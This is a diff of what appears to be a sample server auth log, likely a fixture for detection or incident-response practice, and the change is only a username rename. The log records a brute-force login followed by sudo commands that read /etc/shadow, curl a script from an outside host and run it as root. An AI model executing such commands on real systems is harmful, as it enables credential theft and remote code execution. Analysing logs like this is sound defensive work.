@@ -6,12 +6,12 @@ Mar 15 14:05:11 prod-web1 sshd[12347]: Invalid user test from 203.0.113.42 port 
 Mar 15 14:05:13 prod-web1 sshd[12347]: Failed password for invalid user test from 203.0.113.42 port 44522 ssh2
 Mar 15 14:05:18 prod-web1 sshd[12348]: Invalid user postgres from 203.0.113.42 port 44528
 Mar 15 14:05:20 prod-web1 sshd[12348]: Failed password for invalid user postgres from 203.0.113.42 port 44528 ssh2
-Mar 15 14:05:25 prod-web1 sshd[12349]: Failed password for jbang from 203.0.113.42 port 44532 ssh2
-Mar 15 14:05:28 prod-web1 sshd[12349]: Failed password for jbang from 203.0.113.42 port 44532 ssh2
-Mar 15 14:05:35 prod-web1 sshd[12350]: Accepted publickey for jbang from 203.0.113.42 port 44540 ssh2: RSA SHA256:abcdef
-Mar 15 14:07:00 prod-web1 sudo:    jbang : TTY=pts/0 ; PWD=/home/jbang ; USER=root ; COMMAND=/bin/cat /etc/shadow
-Mar 15 14:07:15 prod-web1 sudo:    jbang : TTY=pts/0 ; PWD=/home/jbang ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.23/s.sh
-Mar 15 14:07:30 prod-web1 sudo:    jbang : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/s.sh
-Mar 15 14:10:00 prod-web1 su: (to root) jbang on pts/0
+Mar 15 14:05:25 prod-web1 sshd[12349]: Failed password for analyst from 203.0.113.42 port 44532 ssh2
+Mar 15 14:05:28 prod-web1 sshd[12349]: Failed password for analyst from 203.0.113.42 port 44532 ssh2
+Mar 15 14:05:35 prod-web1 sshd[12350]: Accepted publickey for analyst from 203.0.113.42 port 44540 ssh2: RSA SHA256:abcdef
+Mar 15 14:07:00 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/bin/cat /etc/shadow
+Mar 15 14:07:15 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/home/analyst ; USER=root ; COMMAND=/usr/bin/curl http://198.51.100.23/s.sh
+Mar 15 14:07:30 prod-web1 sudo:    analyst : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/s.sh
+Mar 15 14:10:00 prod-web1 su: (to root) analyst on pts/0
 Mar 15 09:00:00 prod-web1 sshd[9000]: Accepted password for ops-team from 10.0.0.100 port 51234 ssh2
 Mar 15 09:05:00 prod-web1 sudo:    ops-team : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/usr/bin/tail syslog
